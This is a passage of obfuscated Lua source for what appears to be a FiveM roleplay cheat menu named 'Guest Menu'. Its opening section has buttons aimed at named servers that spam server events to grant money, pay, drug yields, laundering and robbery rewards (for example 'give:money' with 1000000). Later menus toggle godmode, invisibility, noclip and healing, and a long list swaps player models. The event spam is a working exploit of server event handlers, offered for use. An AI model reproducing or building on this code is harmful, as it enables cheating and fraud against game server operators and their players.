                elseif I.button("Give ~b~SlurryIsland", I.GuestCurrentUI._mVersion) then
                    print("[Guest_SLURRY]")
                    local fn = 200
                    d.Main.GuestThread(
                        function()
                            for b7 = 1, fn do
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                d.Main.GuestEvent(
                                    "pughzrg59:jobs_civil:pay",
                                    999
                                )
                                Citizen.Wait(9990)
                            end
                        end
                    )
                elseif I.button("Give ~b~Marseille", I.GuestCurrentUI._mVersion) then
                    print("[Guest_MARSEILLE]")
                    d.Main.GuestEvent("give:money", 1000000)
                    d.Main.GuestEvent("give:money", 1000000)
                    d.Main.GuestEvent("give:money", 1000000)
                    d.Main.GuestEvent("give:money", 1000000)
                    d.Main.GuestEvent("give:money", 1000000)
                    d.Main.GuestEvent("give:money", 1000000)
                    d.Main.GuestEvent("give:money", 1000000)
                elseif I.button("Give ~b~StarLife", I.GuestCurrentUI._mVersion) then
                    print("[Guest_STARLIFE]")
                    d.Main.GuestEvent(
                        "esx_drugs:startHarvestayyyzenCoke",
                        token
                    )
                    d.Main.GuestEvent(
                        "esx_drugs:startTransayyyzenformCoke",
                        token
                    )
                    d.Main.GuestEvent(
                        "esx_drugs:startSellCayyyzenoke",
                        token
                    )
                elseif I.button("Give ~b~Elyzia", I.GuestCurrentUI._mVersion) then
                    print("[Guest_ELYZIA]")
                    d.Main.GuestEvent("esx_atmRobbery:success")
                    d.Main.GuestEvent("esx_illegal:Wash")
                elseif I.button("Give ~g~RS_MISSION", I.GuestCurrentUI._mVersion) then
                    print("[Guest_MISSION]")
                    d.Main.GuestEvent("RS_MISSION:GetPay", 9999999)
                    d.Main.GuestEvent("RS_MISSION:GetPay", 9999999)
                elseif I.button("Give ~b~Bijoux", I.GuestCurrentUI._mVersion) then
                    print("[Guest_BIJOUX]")
                    d.Main.GuestEvent(
                        "esx_vangelico_robbery:gioielli"
                    )
                    d.Main.GuestEvent("lester:vendita")
                elseif I.button("Give ~o~Drogues/Drugs", I.GuestCurrentUI._mVersion) then
                    print("[Guest_DRUGS]")
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_drugs:startHarvestCoke"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_drugs:startTransformCoke"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_drugs:startSellCoke"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_drugs:startHarvestCoke"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_drugs:startTransformCoke"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_drugs:startSellCoke"
                    )
                elseif
                    I.button("Give ~r~Jobs Civil Korioz (pay)", I.GuestCurrentUI._mVersion)
                 then
                    print("[Guest_SALAIRE")
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:pay",
                        999
                    )
                elseif I.button("Give ~r~Jobs Civil (pay)", I.GuestCurrentUI._mVersion) then
                    print("[Guest_SALAIRE")
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                    d.Main.GuestEvent("jobs_civil:pay", 999)
                elseif
                    I.button(
                        "Give ~r~Jobs Civil Korioz (payement)",
                        I.GuestCurrentUI._mVersion
                    )
                 then
                    print("[Guest_SALAIRE")
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::jobs_civil:payement",
                        999
                    )
                elseif I.button("Give ~r~Jobs Civil (payement)", I.GuestCurrentUI._mVersion) then
                    print("[Guest_SALAIRE")
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                    d.Main.GuestEvent("jobs_civil:payement", 999)
                elseif I.button("Wash money ~g~ESX & Korioz", I.GuestCurrentUI._mVersion) then
                    print("[Guest_BLANCHIMENT")
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_moneywash:startWash"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_moneywash:startWash"
                    )
                    d.Main.GuestEvent(
                        "::{korioz#0110}::esx_moneywash:startWash"
                    )
                elseif I.button("Wash money ~g~ESX", I.GuestCurrentUI._mVersion) then
                    print("[Guest_BLANCHIMENT")
                    d.Main.GuestEvent("esx_moneywash:startWash")
                    d.Main.GuestEvent("esx_moneywash:startWash")
                    d.Main.GuestEvent("esx_moneywash:startWash")
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("miscoptions") then
                if I.menuButton("Keybinds", "keybindSettings2", ">") then
                elseif I.menuButton("Menu Settings", "Guestsettings", ">") then
                elseif I.button("~r~Kill Menu", I.GuestCurrentUI._mVersion) then
                    I.ba324546()
                    I.shouldShowMenu = false
                elseif I.button("Version : 1.9.1", I.GuestCurrentUI._mVersion) then
                elseif I.button("Server IP : " .. GetCurrentServerEndpoint()) then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("Guestsettings") then
                if
                    I.comboBox(
                        "Theme",
                        I.GuestCurrentUI.themeUI,
                        en,
                        eo,
                        function(dI, dJ)
                            en = dI
                            eo = dI
                        end
                    )
                 then
                    I.GuestCurrentUI.selectedUI =
                        I.GuestCurrentUI.themeUI[eo]
                    I.initTheme()
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selfOptions") then
                if I.menuButton("Misc", "selfSuperPowers", ">") then
                elseif I.menuButton("Skin Changer", "skinchanger", ">") then
                elseif I.button("~p~			    	HEALTH & ARMOUR") then
                elseif I.button("Revive", "~g~[Safe]") then
                    local coords = GetEntityCoords(PlayerPedId())
                    NetworkResurrectLocalPlayer(coords, GetEntityHeading(PlayerPedId()), true, false)
                    ClearPedBloodDamage(PlayerPedId())
                    TriggerEvent("playerSpawned", coords.x, coords.y, coords.z)
                    StopScreenEffect("DeathFailOut")
                    I.functions.e178da3a04c82538fdaa91c05f2a1f()
                elseif I.button("Suicide", "~g~[Safe]") then
                    I.natives.adc12da2eac5ceb7b3e53abdbb48(I.Guestdata.pLocalPlayer.pedId, 0)
                elseif I.checkBox("~Y~Godmode", I.OptionConfig.godmode) then
                    I.OptionConfig.godmode = not I.OptionConfig.godmode
                elseif I.button("Heal", "~g~[Safe]") then
                    I.natives.adc12da2eac5ceb7b3e53abdbb48(
                        I.Guestdata.pLocalPlayer.pedId,
                        200
                    )
                    Guestcustomnotif("~p~Guest Menu : ~s~Health refilled", 0)
                elseif I.button("Refill armour", "~g~[Safe]") then
                    I.natives.e1281c561cf4fcae7c62d471d8(I.Guestdata.pLocalPlayer.pedId, 200)
                    Guestcustomnotif("~p~Guest Menu : ~s~Armour refilled", 0)
                elseif I.checkBox("~Y~Auto Heal", I.OptionConfig.semiGodmode) then
                    I.OptionConfig.semiGodmode = not I.OptionConfig.semiGodmode
                elseif I.button("~p~			    	    HELPING") then
                elseif I.checkBox("~Y~Invisible", I.OptionConfig.invisible) then
                    I.OptionConfig.invisible = not I.OptionConfig.invisible
                elseif I.checkBox("~Y~Infinite Stamina", I.OptionConfig.infStamina) then
                    I.OptionConfig.infStamina = not I.OptionConfig.infStamina
                elseif I.button("Refill stamina", "~g~[Safe]") then
                    ResetPlayerStamina(I.Guestdata.pLocalPlayer.pedId)
                elseif I.checkBox("~Y~Noclip", I.OptionConfig.noClip) then
                    I.functions.cc1ff3b776a022a5ec5b294ad7cc0ac()
                elseif I.checkBox("~Y~Freecam", I.OptionConfig.noClip) then
                    I.functions.e58b4efdde3c0191a2b9cc78b56dd()
                elseif I.checkBox("~Y~No ragdoll", I.OptionConfig.noRagdoll) then
                    I.OptionConfig.noRagdoll = not I.OptionConfig.noRagdoll
                elseif I.button("Get ~g~thirst/hunger", "~y~[?]") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
                elseif I.button("~p~			    	  OUTFIT OPTIONS") then
                elseif I.button("Random Outfit", "~g~[Safe]") then
                    I.functions.b78cec7a66d920c954ee50b797e03ad2(PlayerId())
                elseif I.button("Become a SWAT", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 17, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 56, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HATS", 40, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HAIR", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 19, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("GLASSES", 0, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 34, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 25, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 58, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL3", 4, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 55, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HANDS", 0, 0)
                elseif I.button("Become Santa Claus", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 8, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 12, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 19, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 4, 4)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL1", 10, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 21, 2)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 19, 0)
                elseif I.button("Become a soldier", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 96, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HATS", 40, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 54, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("GLASSES", 0, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 34, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 25, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL1", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 15, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 53, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HANDS", 51, 0)
                elseif I.button("~p~			    	  MISC OPTIONS") then
                elseif I.button("Edit outfit ~y~[BETA]", "~g~[Safe]") then
                    TriggerEvent("esx_skin:openRestrictedMenu")
                elseif I.checkBox("Fly ~o~(!)", I.OptionConfig.SuperMan) then
                    I.OptionConfig.SuperMan = not I.OptionConfig.SuperMan
                elseif I.button("RC Car", "~g~[Safe]") then
                    ce()
                    I.ba324546()
                end
                local function fo()
                    local fp = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
                    local fq = {}
                    for b7 = 1, fp do
                        fq[b7] = b7
                    end
                    return fq
                end
                local function fr(fs)
                    local ft = GetNumberOfPedTextureVariations(PlayerPedId(), 0, fs)
                    local fu = {}
                    for b7 = 1, ft do
                        fu[b7] = b7
                    end
                    return fu
                end
                local function fv()
                    local fw = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
                    local fx = {}
                    for b7 = 1, fw do
                        fx[b7] = b7
                    end
                    return fx
                end
                local function fy(fz)
                    local fA = GetNumberOfPedTextureVariations(PlayerPedId(), 2, fz)
                    local fB = {}
                    for b7 = 1, fA do
                        fB[b7] = b7
                    end
                    return fB
                end
                local function fC()
                    local fD = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
                    local fE = {}
                    for b7 = 1, fD do
                        fE[b7] = b7
                    end
                    return fE
                end
                local function fF()
                    local fG = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
                    local fH = {}
                    for b7 = 1, fG do
                        fH[b7] = b7
                    end
                    return fH
                end
                local function fI(fJ)
                    local fK = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, fJ)
                    local fL = {}
                    for b7 = 1, fK do
                        fL[b7] = b7
                    end
                    return fL
                end
                local function fo()
                    local fp = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
                    local fq = {}
                    for b7 = 1, fp do
                        fq[b7] = b7
                    end
                    return fq
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("skinchanger") then
                if I.button("Guest |~s~ Clown") then
                    local model = "s_m_y_clown_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mime") then
                    local model = "S_M_Y_Mime"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Stripper") then
                    local model = "s_f_y_stripper_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Cop M") then
                    local model = "s_m_y_cop_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Cop F") then
                    local model = "MP_F_Cop_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Sheriff M") then
                    local model = "S_M_Y_Sheriff_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Sheriff F") then
                    local model = "S_F_Y_Sheriff_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | ~b~SWAT M") then
                    local model = "S_M_Y_Swat_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Armoured Ranger M") then
                    local model = "S_M_M_Armoured_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Ranger F") then
                    local model = "S_F_Y_Ranger_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Ranger Male") then
                    local model = "S_M_Y_Ranger_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Robot Ranger Male") then
                    local model = "U_M_Y_RSRanger_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Desert Army 01") then
                    local model = "G_M_Y_DesArmy_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Desert Army 02") then
                    local model = "G_M_Y_DesArmy_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Desert Army 03") then
                    local model = "G_M_Y_DesArmy_03"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Desert Army 04") then
                    local model = "G_M_Y_DesArmy_04"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Desert Army 05") then
                    local model = "G_M_Y_DesArmy_05"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Marine 01") then
                    local model = "S_M_Y_Marine_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Marine 02") then
                    local model = "S_M_Y_Marine_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Marine 03") then
                    local model = "S_M_Y_Marine_03"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Marine Commander") then
                    local model = "S_M_M_Marine_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Marine General") then
                    local model = "S_M_M_Marine_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Black OPS1 M") then
                    local model = "S_M_Y_BlackOps_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Black OPS2 M") then
                    local model = "S_M_Y_BlackOps_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Black OPS3 M") then
                    local model = "S_M_Y_BlackOps_03"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Prison Guard M") then
                    local model = "S_M_M_PrisGuard_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~b~ Paramedic M") then
                    local model = "S_M_M_Paramedic_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~y~ Vagos F") then
                    local model = "G_F_Y_Vagos_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~g~ Ramp Gang M") then
                    local model = "IG_Ramp_Gang"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~g~ Ramp Gang Boss M") then
                    local model = "CSB_Ramp_gang"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~g~ Fam Gang 01 M") then
                    local model = "MP_M_FamDD_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~g~ Fam Gang 02 M") then
                    local model = "G_M_Y_FamDNF_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~g~ Fam Gang Boss M") then
                    local model = "G_M_Y_FamCA_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~p~ Bella Gang 01 M") then
                    local model = "G_M_Y_BallaEast_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~p~ Bella Gang 02 M") then
                    local model = "G_M_Y_BallaSout_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~p~ Bella Gang 03 M") then
                    local model = "IG_BallasOG"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~p~ Bella Gang 04 M") then
                    local model = "IG_BallasOG"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~p~ Bella Gang F") then
                    local model = "G_F_Y_Ballas_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~p~ Bella Gang Boss M") then
                    local model = "G_M_Y_BallaOrig_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Jewel F") then
                    local model = "U_F_Y_JewelAss_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Jewel Thief") then
                    local model = "U_M_M_JewelThief"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~o~ Prisoner 01 M") then
                    local model = "S_M_Y_PrisMuscl_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~o~ Prisoner 02 M") then
                    local model = "S_M_Y_Prisoner_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~o~ Prisoner 03 M") then
                    local model = "U_M_Y_Prisoner_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Body Builder 01 M") then
                    local model = "A_M_Y_MusclBeac_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Body Builder 02 M") then
                    local model = "A_M_Y_MusclBeac_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Body Builder 03 M") then
                    local model = "A_M_Y_Surfer_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Body Builder 04 M") then
                    local model = "IG_TylerDix"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Body Builder 05 M") then
                    local model = "u_m_y_babyd"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Body Builder F") then
                    local model = "CS_MaryAnn"
                    RequestModel(GetHashKey(model))
                    Wait(500)
